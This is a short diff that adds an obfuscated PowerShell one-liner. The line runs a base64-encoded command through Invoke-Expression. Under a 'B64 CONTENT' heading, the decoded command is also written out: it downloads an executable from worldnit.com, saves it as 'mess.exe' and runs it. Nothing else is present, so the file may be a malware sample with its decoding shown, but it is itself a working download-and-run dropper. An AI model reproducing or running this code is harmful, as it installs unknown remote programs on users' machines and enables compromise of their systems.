@@ -1,0 +1,7 @@
+iex([SysTEm.TeXT.ENCodING]::UtF8.gETSTRinG([SYsteM.CoNveRT]::frombase64sTriNg('CihOZXctT2JqZWN0IFNZU3RlTS5OZVQud0ViQ2xJZW50KS5kT1dOTG9BZGZJbEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vaWdiby5leGUnLCdtZXNzLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ21lc3MuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYSteM.NeT.wEbClIent).dOWNLoAdfIlE('http://worldnit.com/igbo.exe','mess.exe');Start-Process 'mess.exe'
+
